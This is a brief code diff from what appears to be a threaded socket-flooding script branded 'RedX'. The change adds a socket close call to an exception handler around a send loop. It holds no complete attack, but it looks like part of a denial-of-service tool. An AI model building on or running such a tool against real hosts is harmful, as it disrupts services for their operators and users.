@@ -49,6 +49,7 @@ def run2():
                              s.send(data)
                         print("\033[92m[*] RedX Menyenggol")
                 except:
+                        s.close()
                         print("\033[93m[*] RedX In Here Dude")
 for y in range(threads):
         if choice == 'y':
